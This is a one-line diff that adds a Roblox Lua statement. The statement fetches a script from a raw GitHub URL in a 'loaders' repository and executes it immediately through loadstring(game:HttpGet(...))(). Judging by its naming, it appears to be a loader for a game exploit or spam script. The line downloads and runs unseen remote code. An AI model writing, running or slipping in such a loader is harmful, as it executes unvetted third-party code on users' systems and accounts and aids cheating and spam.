@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/SlowDamselLog/loaders/main/loaders/map-southern-mudding-offroading-spam3-qchbo2pcofctlz.lua"))()
